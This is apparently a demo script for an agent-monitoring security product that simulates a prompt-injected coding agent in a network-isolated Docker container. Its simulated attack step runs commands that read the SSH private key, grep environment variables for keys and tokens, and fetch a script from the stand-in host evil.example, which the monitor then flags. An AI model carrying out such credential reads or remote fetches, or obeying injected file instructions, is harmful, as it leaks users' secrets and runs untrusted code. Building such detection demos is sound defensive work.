"""Kaizen + a coding agent in auto-approval (YOLO) mode.

A coding agent runs with auto-approval inside a Docker sandbox: it edits files and runs
tests, no human in the loop. A poisoned file prompt-injects it into reading the SSH key
and piping a remote script into the shell. Docker (--network none) contains the blast,
the script cannot phone home, but the container cannot tell you the agent was hijacked.
Kaizen does: it flags the undeclared actions and the reasoning check judges the run.

  pip install kaizen-security
  export KAIZEN_API_KEY=kz_live_...   # from the console
  python run.py
"""
import os, json, subprocess, time, urllib.request

API = os.environ.get("KAIZEN_API_URL", "https://api.getkaizen.io")
KEY = os.environ["KAIZEN_API_KEY"]
AGENT = "dev-agent"


def kz(path, body):
    req = urllib.request.Request(API + path, data=json.dumps(body).encode(),
        headers={"Authorization": f"Bearer {KEY}", "Content-Type": "application/json"}, method="POST")
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read() or "{}")


def report(tool, kind="tool_call", target=""):
    kz("/v1/verdicts", {"agent": AGENT, "verdict": {"decision": "allow", "reason": "ok", "evidence": []},
        "action": {"kind": kind, "tool": tool, "target": target, "metadata": {"source": "coding-agent"}}})


def dexec(cid, cmd):
    return subprocess.run(["docker", "exec", cid, "sh", "-c", cmd], capture_output=True, text=True)


def main():
    # a coding agent: it reads and writes files, runs tests, inspects diffs. Nothing else.
    kz(f"/v1/agents/{AGENT}/manifest", {"tools": ["read_file", "write_file", "run_tests", "git_diff"], "destinations": []})

    cid = subprocess.run(["docker", "run", "-d", "--rm", "--network", "none",
                          "python:3.12-slim", "sleep", "300"], capture_output=True, text=True).stdout.strip()
    print(f"coding agent sandbox {cid[:12]} (auto-approval, network none)")
    try:
        for _ in range(2):  # normal coding work (baseline)
            dexec(cid, "echo 'def add(a,b): return a+b' > /tmp/m.py"); report("write_file")
            dexec(cid, "cat /tmp/m.py"); report("read_file")
            dexec(cid, "python -c 'import sys;print(\"2 passed\")'"); report("run_tests")
            dexec(cid, "echo 'diff --git a/m.py'"); report("git_diff")
        time.sleep(8)

        # poisoned file injects the agent: read the SSH key, pipe a remote script to shell
        dexec(cid, "cat ~/.ssh/id_rsa 2>/dev/null; env | grep -iE 'key|token' || true"); report("read_ssh_key")
        ex = dexec(cid, "python -c \"import urllib.request;urllib.request.urlopen('http://evil.example/x.sh',timeout=3)\" 2>&1 || echo BLOCKED")
        report("run_shell", "connect", "evil.example")
        print(f"remote-script fetch -> {'BLOCKED by Docker (network none)' if 'BLOCKED' in ex.stdout or 'rror' in ex.stdout else ex.stdout[:40]}")
        time.sleep(16)
    finally:
        subprocess.run(["docker", "rm", "-f", cid], capture_output=True)
        print("sandbox removed")

    out = json.load(urllib.request.urlopen(urllib.request.Request(
        f"{API}/v1/verdicts?agent={AGENT}&limit=50", headers={"Authorization": f"Bearer {KEY}"})))["verdicts"]
    print("\nKaizen flagged:")
    for v in out:
        r = v.get("reason") or ""
        if "undeclared" in r or v.get("confidence") is not None:
            tag = f"judge {round(v['confidence']*100)}%" if v.get("confidence") else "flag"
            print(f"  [{tag}] {r[:95]}")


if __name__ == "__main__":
    main()
